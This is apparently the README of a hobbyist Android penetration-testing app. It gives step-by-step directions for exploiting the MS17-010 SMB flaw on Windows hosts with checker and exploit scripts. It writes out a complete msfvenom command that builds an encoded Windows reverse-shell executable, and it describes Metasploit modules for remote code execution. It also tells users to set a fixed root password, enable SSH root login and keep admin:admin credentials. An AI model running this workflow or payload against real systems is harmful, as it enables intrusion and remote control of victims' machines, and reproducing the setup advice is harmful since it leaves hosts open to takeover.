# Hack Into Your Heart

**This tool is only use for academic and educational.If someone use this tool causes any loss to others, I will not take any responsibility.**

You must change root password to !ROOTER and open SSH root permissions.

Download:
```
git clone https://github.com/aifred0729-TW/hack_into_your_heart.git
```

## Usage

Install Offensive_Security on android phone or your android virtual environment.

Login page default credentials is admin:admin

Start SSH service for AI2 program connect.
Download the ms17-010.sh to /root and put the command.rc to /root, ms17-010.sh will used.
If the vulnerable VM has the MS17-010 vulnerabilities, you can run checker.py with python2 to confirm target can be exploit.
When checker.py is successful scan the vulnerable VM pipe, run send_and_execute.py with python2 to exploit the vulnerable VM.

If you no have the shell.exe, use the msfvenom to spawn one.
```
msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=<Your Local IP> LPORT=<Listen Port> -f exe -o shell.exe
```

Linux Bash:
Type the IP address of kali and type your bash command on it, than you can execute.
If you know how to use the ssh, then you should be know how to use this modulel.

Example Command:
```
ifconfig
```

Nmap Module:
Type the IP address of kali and target and setup the option then you can execute.
Scan report will below the console.


Searchsploit Module:
Type the vulnerabilities number or CMS/Service name and version.
If the input text is vulnerable, than it will show the exploit.

Metasploit Module:
Type the RHost LHost to input box and select a exploit module, then you can exploit.
For security reason, if metasploit successful remote code execution, the target will be shutdown in 3 second.
**The Target is not 100% can be exploit**


My Email:aifred0729@yahoo.com
My Facebook:https://www.facebook.com/profile.php?id=100009717251061

Try Harder!!

